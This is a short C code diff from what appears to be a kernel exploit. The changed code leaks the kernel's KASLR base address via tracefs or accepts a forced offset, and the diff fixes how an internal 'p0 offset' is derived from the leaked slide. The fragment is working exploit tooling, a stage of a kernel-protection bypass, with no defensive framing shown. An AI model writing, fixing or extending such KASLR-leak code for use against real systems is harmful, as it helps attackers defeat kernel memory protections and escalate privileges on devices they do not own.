@@ -132,7 +132,7 @@ static int slide_tracefs_leak_kernel_base(void) {
     return 0;
   }
 
-  slide_p0_offset = candidate;
+  slide_p0_offset = SLIDE_P0_FROM_KASLR(candidate);
   kaslr_base = KIMAGE_TEXT_BASE + candidate;
   kaslr_slide = candidate;
   kaslr_done = 1;
@@ -154,9 +154,9 @@ int slide_leak_kernel_base(void) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
-    slide_p0_offset = (uintptr_t)value;
-    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
-    kaslr_slide = slide_p0_offset;
+    kaslr_slide = (uintptr_t)value;
+    kaslr_base = KIMAGE_TEXT_BASE + kaslr_slide;
+    slide_p0_offset = SLIDE_P0_FROM_KASLR(kaslr_slide);
     kaslr_done = 1;
     pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
                "slide=%016llx p0_offset=%08zx\n",
